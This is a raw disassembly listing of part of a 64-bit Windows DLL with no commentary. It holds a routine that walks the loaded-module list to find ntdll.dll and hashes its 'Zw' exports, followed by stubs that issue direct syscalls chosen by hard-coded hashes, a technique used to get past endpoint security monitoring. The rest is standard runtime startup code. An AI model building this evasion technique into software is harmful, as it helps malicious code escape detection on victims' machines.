   180001f06:	e8 19 f7 ff ff       	call   0x180001624
   180001f0b:	85 c0                	test   %eax,%eax
   180001f0d:	0f 95 c3             	setne  %bl
   180001f10:	8b 05 ce 41 00 00    	mov    0x41ce(%rip),%eax        # 0x1800060e4
   180001f16:	83 f8 03             	cmp    $0x3,%eax
   180001f19:	74 09                	je     0x180001f24
   180001f1b:	83 f8 01             	cmp    $0x1,%eax
   180001f1e:	0f 85 53 ff ff ff    	jne    0x180001e77
   180001f24:	48 8b 8d a0 05 00 00 	mov    0x5a0(%rbp),%rcx
   180001f2b:	48 33 cc             	xor    %rsp,%rcx
   180001f2e:	e8 6d 04 00 00       	call   0x1800023a0
   180001f33:	48 8b 9c 24 c0 06 00 	mov    0x6c0(%rsp),%rbx
   180001f3a:	00 
   180001f3b:	48 81 c4 b0 06 00 00 	add    $0x6b0,%rsp
   180001f42:	5d                   	pop    %rbp
   180001f43:	c3                   	ret
   180001f44:	48 83 ec 28          	sub    $0x28,%rsp
   180001f48:	83 e9 01             	sub    $0x1,%ecx
   180001f4b:	74 3b                	je     0x180001f88
   180001f4d:	83 e9 01             	sub    $0x1,%ecx
   180001f50:	74 21                	je     0x180001f73
   180001f52:	83 e9 01             	sub    $0x1,%ecx
   180001f55:	74 07                	je     0x180001f5e
   180001f57:	83 f9 02             	cmp    $0x2,%ecx
   180001f5a:	75 52                	jne    0x180001fae
   180001f5c:	eb 43                	jmp    0x180001fa1
   180001f5e:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001f63:	44 8d 41 fc          	lea    -0x4(%rcx),%r8d
   180001f67:	e8 e0 fc ff ff       	call   0x180001c4c
   180001f6c:	b9 04 00 00 00       	mov    $0x4,%ecx
   180001f71:	eb 33                	jmp    0x180001fa6
   180001f73:	b9 06 00 00 00       	mov    $0x6,%ecx
   180001f78:	44 8d 41 fb          	lea    -0x5(%rcx),%r8d
   180001f7c:	e8 cb fc ff ff       	call   0x180001c4c
   180001f81:	b9 07 00 00 00       	mov    $0x7,%ecx
   180001f86:	eb 1e                	jmp    0x180001fa6
   180001f88:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001f8d:	44 8d 41 fe          	lea    -0x2(%rcx),%r8d
   180001f91:	e8 b6 fc ff ff       	call   0x180001c4c
   180001f96:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180001f9b:	ff 15 7f 20 00 00    	call   *0x207f(%rip)        # 0x180004020
   180001fa1:	b9 01 00 00 00       	mov    $0x1,%ecx
   180001fa6:	45 33 c0             	xor    %r8d,%r8d
   180001fa9:	e8 9e fc ff ff       	call   0x180001c4c
   180001fae:	48 83 c4 28          	add    $0x28,%rsp
   180001fb2:	c3                   	ret
   180001fb3:	cc                   	int3
   180001fb4:	48 8b c4             	mov    %rsp,%rax
   180001fb7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001fbb:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180001fbf:	48 89 70 18          	mov    %rsi,0x18(%rax)
   180001fc3:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180001fc7:	41 55                	push   %r13
   180001fc9:	41 56                	push   %r14
   180001fcb:	83 3d 7e 48 00 00 00 	cmpl   $0x0,0x487e(%rip)        # 0x180006850
   180001fd2:	0f 85 8c 01 00 00    	jne    0x180002164
   180001fd8:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180001fdf:	00 00 
   180001fe1:	33 d2                	xor    %edx,%edx
   180001fe3:	48 8b 48 18          	mov    0x18(%rax),%rcx
   180001fe7:	4c 8b 49 10          	mov    0x10(%rcx),%r9
   180001feb:	49 8b 41 30          	mov    0x30(%r9),%rax
   180001fef:	48 85 c0             	test   %rax,%rax
   180001ff2:	0f 84 8a 01 00 00    	je     0x180002182
   180001ff8:	41 ba 20 20 20 20    	mov    $0x20202020,%r10d
   180001ffe:	4c 8b c0             	mov    %rax,%r8
   180002001:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   180002005:	42 8b 8c 00 88 00 00 	mov    0x88(%rax,%r8,1),%ecx
   18000200c:	00 
   18000200d:	85 c9                	test   %ecx,%ecx
   18000200f:	74 24                	je     0x180002035
   180002011:	49 8d 14 08          	lea    (%r8,%rcx,1),%rdx
   180002015:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180002018:	42 8b 04 01          	mov    (%rcx,%r8,1),%eax
   18000201c:	41 0b c2             	or     %r10d,%eax
   18000201f:	3d 6e 74 64 6c       	cmp    $0x6c64746e,%eax
   180002024:	75 0f                	jne    0x180002035
   180002026:	42 8b 44 01 04       	mov    0x4(%rcx,%r8,1),%eax
   18000202b:	41 0b c2             	or     %r10d,%eax
   18000202e:	3d 6c 2e 64 6c       	cmp    $0x6c642e6c,%eax
   180002033:	74 0c                	je     0x180002041
   180002035:	4d 8b 09             	mov    (%r9),%r9
   180002038:	49 8b 41 30          	mov    0x30(%r9),%rax
   18000203c:	48 85 c0             	test   %rax,%rax
   18000203f:	75 bd                	jne    0x180001ffe
   180002041:	48 85 d2             	test   %rdx,%rdx
   180002044:	0f 84 38 01 00 00    	je     0x180002182
   18000204a:	8b 7a 1c             	mov    0x1c(%rdx),%edi
   18000204d:	4c 8d 2d fc 47 00 00 	lea    0x47fc(%rip),%r13        # 0x180006850
   180002054:	44 8b 5a 20          	mov    0x20(%rdx),%r11d
   180002058:	49 03 f8             	add    %r8,%rdi
   18000205b:	8b 72 24             	mov    0x24(%rdx),%esi
   18000205e:	4d 03 d8             	add    %r8,%r11
   180002061:	8b 5a 18             	mov    0x18(%rdx),%ebx
   180002064:	49 03 f0             	add    %r8,%rsi
   180002067:	33 d2                	xor    %edx,%edx
   180002069:	8d 43 ff             	lea    -0x1(%rbx),%eax
   18000206c:	45 8b 0c 83          	mov    (%r11,%rax,4),%r9d
   180002070:	8b d8                	mov    %eax,%ebx
   180002072:	4d 03 c8             	add    %r8,%r9
   180002075:	44 8b f0             	mov    %eax,%r14d
   180002078:	b8 5a 77 00 00       	mov    $0x775a,%eax
   18000207d:	66 41 39 01          	cmp    %ax,(%r9)
   180002081:	75 51                	jne    0x1800020d4
   180002083:	33 ed                	xor    %ebp,%ebp
   180002085:	41 ba 4e bf 6f 2d    	mov    $0x2d6fbf4e,%r10d
   18000208b:	41 38 29             	cmp    %bpl,(%r9)
   18000208e:	74 1d                	je     0x1800020ad
   180002090:	49 8b c1             	mov    %r9,%rax
   180002093:	0f b7 00             	movzwl (%rax),%eax
   180002096:	41 8b ca             	mov    %r10d,%ecx
   180002099:	c1 c9 08             	ror    $0x8,%ecx
   18000209c:	ff c5                	inc    %ebp
   18000209e:	03 c8                	add    %eax,%ecx
   1800020a0:	8b c5                	mov    %ebp,%eax
   1800020a2:	49 03 c1             	add    %r9,%rax
   1800020a5:	44 33 d1             	xor    %ecx,%r10d
   1800020a8:	80 38 00             	cmpb   $0x0,(%rax)
   1800020ab:	75 e6                	jne    0x180002093
   1800020ad:	8b ca                	mov    %edx,%ecx
   1800020af:	ff c2                	inc    %edx
   1800020b1:	48 03 c9             	add    %rcx,%rcx
   1800020b4:	45 89 54 cd 08       	mov    %r10d,0x8(%r13,%rcx,8)
   1800020b9:	42 0f b7 04 76       	movzwl (%rsi,%r14,2),%eax
   1800020be:	8b 04 87             	mov    (%rdi,%rax,4),%eax
   1800020c1:	49 83 64 cd 10 00    	andq   $0x0,0x10(%r13,%rcx,8)
   1800020c7:	41 89 44 cd 0c       	mov    %eax,0xc(%r13,%rcx,8)
   1800020cc:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
   1800020d2:	74 04                	je     0x1800020d8
   1800020d4:	85 db                	test   %ebx,%ebx
   1800020d6:	75 91                	jne    0x180002069
   1800020d8:	45 33 c0             	xor    %r8d,%r8d
   1800020db:	89 15 6f 47 00 00    	mov    %edx,0x476f(%rip)        # 0x180006850
   1800020e1:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800020e4:	85 c0                	test   %eax,%eax
   1800020e6:	74 7c                	je     0x180002164
   1800020e8:	8b c2                	mov    %edx,%eax
   1800020ea:	33 c9                	xor    %ecx,%ecx
   1800020ec:	41 2b c0             	sub    %r8d,%eax
   1800020ef:	83 f8 01             	cmp    $0x1,%eax
   1800020f2:	74 65                	je     0x180002159
   1800020f4:	44 8d 59 01          	lea    0x1(%rcx),%r11d
   1800020f8:	44 8b d1             	mov    %ecx,%r10d
   1800020fb:	4d 03 d2             	add    %r10,%r10
   1800020fe:	45 8b cb             	mov    %r11d,%r9d
   180002101:	4d 03 c9             	add    %r9,%r9
   180002104:	43 8b 7c d5 0c       	mov    0xc(%r13,%r10,8),%edi
   180002109:	43 8b 5c cd 0c       	mov    0xc(%r13,%r9,8),%ebx
   18000210e:	3b fb                	cmp    %ebx,%edi
   180002110:	76 38                	jbe    0x18000214a
   180002112:	43 8b 54 d5 08       	mov    0x8(%r13,%r10,8),%edx
   180002117:	43 8b 44 cd 08       	mov    0x8(%r13,%r9,8),%eax
   18000211c:	4b 8b 4c d5 10       	mov    0x10(%r13,%r10,8),%rcx
   180002121:	43 89 44 d5 08       	mov    %eax,0x8(%r13,%r10,8)
   180002126:	4b 8b 44 cd 10       	mov    0x10(%r13,%r9,8),%rax
   18000212b:	4b 89 44 d5 10       	mov    %rax,0x10(%r13,%r10,8)
   180002130:	43 89 5c d5 0c       	mov    %ebx,0xc(%r13,%r10,8)
   180002135:	43 89 54 cd 08       	mov    %edx,0x8(%r13,%r9,8)
   18000213a:	43 89 7c cd 0c       	mov    %edi,0xc(%r13,%r9,8)
   18000213f:	4b 89 4c cd 10       	mov    %rcx,0x10(%r13,%r9,8)
   180002144:	8b 15 06 47 00 00    	mov    0x4706(%rip),%edx        # 0x180006850
   18000214a:	8b c2                	mov    %edx,%eax
   18000214c:	41 8b cb             	mov    %r11d,%ecx
   18000214f:	41 2b c0             	sub    %r8d,%eax
   180002152:	ff c8                	dec    %eax
   180002154:	44 3b d8             	cmp    %eax,%r11d
   180002157:	72 9b                	jb     0x1800020f4
   180002159:	41 ff c0             	inc    %r8d
   18000215c:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000215f:	44 3b c0             	cmp    %eax,%r8d
   180002162:	72 84                	jb     0x1800020e8
   180002164:	b8 01 00 00 00       	mov    $0x1,%eax
   180002169:	48 8b 5c 24 18       	mov    0x18(%rsp),%rbx
   18000216e:	48 8b 6c 24 20       	mov    0x20(%rsp),%rbp
   180002173:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   180002178:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   18000217d:	41 5e                	pop    %r14
   18000217f:	41 5d                	pop    %r13
   180002181:	c3                   	ret
   180002182:	33 c0                	xor    %eax,%eax
   180002184:	eb e3                	jmp    0x180002169
   180002186:	cc                   	int3
   180002187:	cc                   	int3
   180002188:	40 53                	rex push %rbx
   18000218a:	48 83 ec 20          	sub    $0x20,%rsp
   18000218e:	8b d9                	mov    %ecx,%ebx
   180002190:	e8 1f fe ff ff       	call   0x180001fb4
   180002195:	33 d2                	xor    %edx,%edx
   180002197:	85 c0                	test   %eax,%eax
   180002199:	74 24                	je     0x1800021bf
   18000219b:	4c 8b 05 ae 46 00 00 	mov    0x46ae(%rip),%r8        # 0x180006850
   1800021a2:	45 85 c0             	test   %r8d,%r8d
   1800021a5:	74 18                	je     0x1800021bf
   1800021a7:	8b c2                	mov    %edx,%eax
   1800021a9:	48 8d 0d a8 46 00 00 	lea    0x46a8(%rip),%rcx        # 0x180006858
   1800021b0:	48 03 c0             	add    %rax,%rax
   1800021b3:	3b 1c c1             	cmp    (%rcx,%rax,8),%ebx
   1800021b6:	74 10                	je     0x1800021c8
   1800021b8:	ff c2                	inc    %edx
   1800021ba:	41 3b d0             	cmp    %r8d,%edx
   1800021bd:	72 e8                	jb     0x1800021a7
   1800021bf:	83 c8 ff             	or     $0xffffffff,%eax
   1800021c2:	48 83 c4 20          	add    $0x20,%rsp
   1800021c6:	5b                   	pop    %rbx
   1800021c7:	c3                   	ret
   1800021c8:	8b c2                	mov    %edx,%eax
   1800021ca:	eb f6                	jmp    0x1800021c2
   1800021cc:	cc                   	int3
   1800021cd:	cc                   	int3
   1800021ce:	cc                   	int3
   1800021cf:	cc                   	int3
   1800021d0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800021d5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800021da:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800021df:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800021e4:	48 83 ec 28          	sub    $0x28,%rsp
   1800021e8:	b9 0f 17 99 09       	mov    $0x999170f,%ecx
   1800021ed:	e8 96 ff ff ff       	call   0x180002188
   1800021f2:	48 83 c4 28          	add    $0x28,%rsp
   1800021f6:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1800021fb:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002200:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002205:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000220a:	4c 8b d1             	mov    %rcx,%r10
   18000220d:	0f 05                	syscall
   18000220f:	c3                   	ret
   180002210:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002215:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000221a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000221f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002224:	48 83 ec 28          	sub    $0x28,%rsp
   180002228:	b9 7b eb 95 8d       	mov    $0x8d95eb7b,%ecx
   18000222d:	e8 56 ff ff ff       	call   0x180002188
   180002232:	48 83 c4 28          	add    $0x28,%rsp
   180002236:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000223b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002240:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002245:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000224a:	4c 8b d1             	mov    %rcx,%r10
   18000224d:	0f 05                	syscall
   18000224f:	c3                   	ret
   180002250:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002255:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000225a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000225f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002264:	48 83 ec 28          	sub    $0x28,%rsp
   180002268:	b9 34 44 b9 45       	mov    $0x45b94434,%ecx
   18000226d:	e8 16 ff ff ff       	call   0x180002188
   180002272:	48 83 c4 28          	add    $0x28,%rsp
   180002276:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000227b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002280:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002285:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000228a:	4c 8b d1             	mov    %rcx,%r10
   18000228d:	0f 05                	syscall
   18000228f:	c3                   	ret
   180002290:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002295:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000229a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000229f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800022a4:	48 83 ec 28          	sub    $0x28,%rsp
   1800022a8:	b9 1b 01 97 05       	mov    $0x597011b,%ecx
   1800022ad:	e8 d6 fe ff ff       	call   0x180002188
   1800022b2:	48 83 c4 28          	add    $0x28,%rsp
   1800022b6:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1800022bb:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1800022c0:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1800022c5:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1800022ca:	4c 8b d1             	mov    %rcx,%r10
   1800022cd:	0f 05                	syscall
   1800022cf:	c3                   	ret
   1800022d0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1800022d5:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1800022da:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1800022df:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800022e4:	48 83 ec 28          	sub    $0x28,%rsp
   1800022e8:	b9 1e 1a bf 42       	mov    $0x42bf1a1e,%ecx
   1800022ed:	e8 96 fe ff ff       	call   0x180002188
   1800022f2:	48 83 c4 28          	add    $0x28,%rsp
   1800022f6:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1800022fb:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002300:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002305:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000230a:	4c 8b d1             	mov    %rcx,%r10
   18000230d:	0f 05                	syscall
   18000230f:	c3                   	ret
   180002310:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002315:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000231a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000231f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002324:	48 83 ec 28          	sub    $0x28,%rsp
   180002328:	b9 9f 23 ce 00       	mov    $0xce239f,%ecx
   18000232d:	e8 56 fe ff ff       	call   0x180002188
   180002332:	48 83 c4 28          	add    $0x28,%rsp
   180002336:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000233b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002340:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002345:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000234a:	4c 8b d1             	mov    %rcx,%r10
   18000234d:	0f 05                	syscall
   18000234f:	c3                   	ret
   180002350:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002355:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000235a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000235f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180002364:	48 83 ec 28          	sub    $0x28,%rsp
   180002368:	b9 75 38 db 02       	mov    $0x2db3875,%ecx
   18000236d:	e8 16 fe ff ff       	call   0x180002188
   180002372:	48 83 c4 28          	add    $0x28,%rsp
   180002376:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   18000237b:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   180002380:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   180002385:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   18000238a:	4c 8b d1             	mov    %rcx,%r10
   18000238d:	0f 05                	syscall
   18000238f:	c3                   	ret
   180002390:	cc                   	int3
   180002391:	cc                   	int3
   180002392:	cc                   	int3
   180002393:	cc                   	int3
   180002394:	cc                   	int3
   180002395:	cc                   	int3
   180002396:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000239d:	00 00 00 
   1800023a0:	48 3b 0d 59 3c 00 00 	cmp    0x3c59(%rip),%rcx        # 0x180006000
   1800023a7:	75 10                	jne    0x1800023b9
   1800023a9:	48 c1 c1 10          	rol    $0x10,%rcx
   1800023ad:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800023b2:	75 01                	jne    0x1800023b5
   1800023b4:	c3                   	ret
   1800023b5:	48 c1 c9 10          	ror    $0x10,%rcx
   1800023b9:	e9 8e 03 00 00       	jmp    0x18000274c
   1800023be:	cc                   	int3
   1800023bf:	cc                   	int3
   1800023c0:	e9 cf 04 00 00       	jmp    0x180002894
   1800023c5:	cc                   	int3
   1800023c6:	cc                   	int3
   1800023c7:	cc                   	int3
   1800023c8:	48 83 ec 28          	sub    $0x28,%rsp
   1800023cc:	85 d2                	test   %edx,%edx
   1800023ce:	74 39                	je     0x180002409
   1800023d0:	83 ea 01             	sub    $0x1,%edx
   1800023d3:	74 28                	je     0x1800023fd
   1800023d5:	83 ea 01             	sub    $0x1,%edx
   1800023d8:	74 16                	je     0x1800023f0
   1800023da:	83 fa 01             	cmp    $0x1,%edx
   1800023dd:	74 0a                	je     0x1800023e9
   1800023df:	b8 01 00 00 00       	mov    $0x1,%eax
   1800023e4:	48 83 c4 28          	add    $0x28,%rsp
   1800023e8:	c3                   	ret
   1800023e9:	e8 aa 06 00 00       	call   0x180002a98
   1800023ee:	eb 05                	jmp    0x1800023f5
   1800023f0:	e8 7b 06 00 00       	call   0x180002a70
   1800023f5:	0f b6 c0             	movzbl %al,%eax
   1800023f8:	48 83 c4 28          	add    $0x28,%rsp
   1800023fc:	c3                   	ret
   1800023fd:	49 8b d0             	mov    %r8,%rdx
   180002400:	48 83 c4 28          	add    $0x28,%rsp
   180002404:	e9 0f 00 00 00       	jmp    0x180002418
   180002409:	4d 85 c0             	test   %r8,%r8
   18000240c:	0f 95 c1             	setne  %cl
   18000240f:	48 83 c4 28          	add    $0x28,%rsp
   180002413:	e9 18 01 00 00       	jmp    0x180002530
   180002418:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000241d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180002422:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180002427:	41 56                	push   %r14
   180002429:	48 83 ec 20          	sub    $0x20,%rsp
   18000242d:	48 8b f2             	mov    %rdx,%rsi
   180002430:	4c 8b f1             	mov    %rcx,%r14
   180002433:	33 c9                	xor    %ecx,%ecx
   180002435:	e8 1a 07 00 00       	call   0x180002b54
   18000243a:	84 c0                	test   %al,%al
   18000243c:	0f 84 c8 00 00 00    	je     0x18000250a
   180002442:	e8 a1 05 00 00       	call   0x1800029e8
   180002447:	8a d8                	mov    %al,%bl
   180002449:	88 44 24 40          	mov    %al,0x40(%rsp)
   18000244d:	40 b7 01             	mov    $0x1,%dil
   180002450:	83 3d 59 43 00 00 00 	cmpl   $0x0,0x4359(%rip)        # 0x1800067b0
   180002457:	0f 85 c5 00 00 00    	jne    0x180002522
   18000245d:	c7 05 49 43 00 00 01 	movl   $0x1,0x4349(%rip)        # 0x1800067b0
   180002464:	00 00 00 
   180002467:	e8 ec 05 00 00       	call   0x180002a58
   18000246c:	84 c0                	test   %al,%al
   18000246e:	74 4f                	je     0x1800024bf
   180002470:	e8 e7 09 00 00       	call   0x180002e5c
   180002475:	e8 26 05 00 00       	call   0x1800029a0
   18000247a:	e8 4d 05 00 00       	call   0x1800029cc
   18000247f:	48 8d 15 62 1d 00 00 	lea    0x1d62(%rip),%rdx        # 0x1800041e8
   180002486:	48 8d 0d 53 1d 00 00 	lea    0x1d53(%rip),%rcx        # 0x1800041e0
   18000248d:	e8 2d 0f 00 00       	call   0x1800033bf
   180002492:	85 c0                	test   %eax,%eax
   180002494:	75 29                	jne    0x1800024bf
   180002496:	e8 89 05 00 00       	call   0x180002a24
   18000249b:	84 c0                	test   %al,%al
   18000249d:	74 20                	je     0x1800024bf
   18000249f:	48 8d 15 32 1d 00 00 	lea    0x1d32(%rip),%rdx        # 0x1800041d8
   1800024a6:	48 8d 0d 23 1d 00 00 	lea    0x1d23(%rip),%rcx        # 0x1800041d0
   1800024ad:	e8 07 0f 00 00       	call   0x1800033b9
   1800024b2:	c7 05 f4 42 00 00 02 	movl   $0x2,0x42f4(%rip)        # 0x1800067b0
   1800024b9:	00 00 00 
   1800024bc:	40 32 ff             	xor    %dil,%dil
   1800024bf:	8a cb                	mov    %bl,%cl
   1800024c1:	e8 ee 07 00 00       	call   0x180002cb4
   1800024c6:	40 84 ff             	test   %dil,%dil
   1800024c9:	75 3f                	jne    0x18000250a
   1800024cb:	e8 34 08 00 00       	call   0x180002d04
   1800024d0:	48 8b d8             	mov    %rax,%rbx
   1800024d3:	48 83 38 00          	cmpq   $0x0,(%rax)
   1800024d7:	74 24                	je     0x1800024fd
   1800024d9:	48 8b c8             	mov    %rax,%rcx
   1800024dc:	e8 3b 07 00 00       	call   0x180002c1c
   1800024e1:	84 c0                	test   %al,%al
   1800024e3:	74 18                	je     0x1800024fd
   1800024e5:	4c 8b c6             	mov    %rsi,%r8
   1800024e8:	ba 02 00 00 00       	mov    $0x2,%edx
   1800024ed:	49 8b ce             	mov    %r14,%rcx
   1800024f0:	48 8b 03             	mov    (%rbx),%rax
   1800024f3:	4c 8b 0d ae 1c 00 00 	mov    0x1cae(%rip),%r9        # 0x1800041a8
   1800024fa:	41 ff d1             	call   *%r9
   1800024fd:	ff 05 0d 3d 00 00    	incl   0x3d0d(%rip)        # 0x180006210
   180002503:	b8 01 00 00 00       	mov    $0x1,%eax
   180002508:	eb 02                	jmp    0x18000250c
   18000250a:	33 c0                	xor    %eax,%eax
   18000250c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002511:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002516:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000251b:	48 83 c4 20          	add    $0x20,%rsp
   18000251f:	41 5e                	pop    %r14
   180002521:	c3                   	ret
   180002522:	b9 07 00 00 00       	mov    $0x7,%ecx
   180002527:	e8 e8 07 00 00       	call   0x180002d14
   18000252c:	90                   	nop
   18000252d:	cc                   	int3
   18000252e:	cc                   	int3
   18000252f:	cc                   	int3
   180002530:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002535:	57                   	push   %rdi
   180002536:	48 83 ec 30          	sub    $0x30,%rsp
   18000253a:	40 8a f9             	mov    %cl,%dil
   18000253d:	8b 05 cd 3c 00 00    	mov    0x3ccd(%rip),%eax        # 0x180006210
   180002543:	85 c0                	test   %eax,%eax
   180002545:	7f 0d                	jg     0x180002554
   180002547:	33 c0                	xor    %eax,%eax
   180002549:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000254e:	48 83 c4 30          	add    $0x30,%rsp
   180002552:	5f                   	pop    %rdi
   180002553:	c3                   	ret
   180002554:	ff c8                	dec    %eax
   180002556:	89 05 b4 3c 00 00    	mov    %eax,0x3cb4(%rip)        # 0x180006210
   18000255c:	e8 87 04 00 00       	call   0x1800029e8
   180002561:	8a d8                	mov    %al,%bl
   180002563:	88 44 24 20          	mov    %al,0x20(%rsp)
   180002567:	83 3d 42 42 00 00 02 	cmpl   $0x2,0x4242(%rip)        # 0x1800067b0
   18000256e:	75 33                	jne    0x1800025a3
   180002570:	e8 9b 05 00 00       	call   0x180002b10
   180002575:	e8 36 04 00 00       	call   0x1800029b0
   18000257a:	e8 19 09 00 00       	call   0x180002e98
   18000257f:	83 25 2a 42 00 00 00 	andl   $0x0,0x422a(%rip)        # 0x1800067b0
   180002586:	8a cb                	mov    %bl,%cl
   180002588:	e8 27 07 00 00       	call   0x180002cb4
   18000258d:	33 d2                	xor    %edx,%edx
   18000258f:	40 8a cf             	mov    %dil,%cl
   180002592:	e8 41 07 00 00       	call   0x180002cd8
   180002597:	0f b6 d8             	movzbl %al,%ebx
   18000259a:	e8 a1 05 00 00       	call   0x180002b40
   18000259f:	8b c3                	mov    %ebx,%eax
   1800025a1:	eb a6                	jmp    0x180002549
   1800025a3:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800025a8:	e8 67 07 00 00       	call   0x180002d14
   1800025ad:	90                   	nop
   1800025ae:	90                   	nop
   1800025af:	cc                   	int3
   1800025b0:	48 8b c4             	mov    %rsp,%rax
   1800025b3:	48 89 58 20          	mov    %rbx,0x20(%rax)
   1800025b7:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1800025bb:	89 50 10             	mov    %edx,0x10(%rax)
   1800025be:	48 89 48 08          	mov    %rcx,0x8(%rax)
   1800025c2:	56                   	push   %rsi
   1800025c3:	57                   	push   %rdi
   1800025c4:	41 56                	push   %r14
   1800025c6:	48 83 ec 40          	sub    $0x40,%rsp
   1800025ca:	49 8b f0             	mov    %r8,%rsi
   1800025cd:	8b fa                	mov    %edx,%edi
   1800025cf:	4c 8b f1             	mov    %rcx,%r14
   1800025d2:	85 d2                	test   %edx,%edx
   1800025d4:	75 0f                	jne    0x1800025e5
   1800025d6:	39 15 34 3c 00 00    	cmp    %edx,0x3c34(%rip)        # 0x180006210
   1800025dc:	7f 07                	jg     0x1800025e5
   1800025de:	33 c0                	xor    %eax,%eax
   1800025e0:	e9 e5 00 00 00       	jmp    0x1800026ca
   1800025e5:	8d 42 ff             	lea    -0x1(%rdx),%eax
   1800025e8:	83 f8 01             	cmp    $0x1,%eax
   1800025eb:	77 40                	ja     0x18000262d
   1800025ed:	48 8b 05 1c 1c 00 00 	mov    0x1c1c(%rip),%rax        # 0x180004210
   1800025f4:	48 85 c0             	test   %rax,%rax
   1800025f7:	75 05                	jne    0x1800025fe
   1800025f9:	8d 58 01             	lea    0x1(%rax),%ebx
   1800025fc:	eb 08                	jmp    0x180002606
   1800025fe:	ff 15 a4 1b 00 00    	call   *0x1ba4(%rip)        # 0x1800041a8
   180002604:	8b d8                	mov    %eax,%ebx
   180002606:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   18000260a:	85 db                	test   %ebx,%ebx
   18000260c:	0f 84 ae 00 00 00    	je     0x1800026c0
   180002612:	4c 8b c6             	mov    %rsi,%r8
   180002615:	8b d7                	mov    %edi,%edx
   180002617:	49 8b ce             	mov    %r14,%rcx
   18000261a:	e8 a9 fd ff ff       	call   0x1800023c8
   18000261f:	8b d8                	mov    %eax,%ebx
   180002621:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002625:	85 c0                	test   %eax,%eax
   180002627:	0f 84 93 00 00 00    	je     0x1800026c0
   18000262d:	4c 8b c6             	mov    %rsi,%r8
   180002630:	8b d7                	mov    %edi,%edx
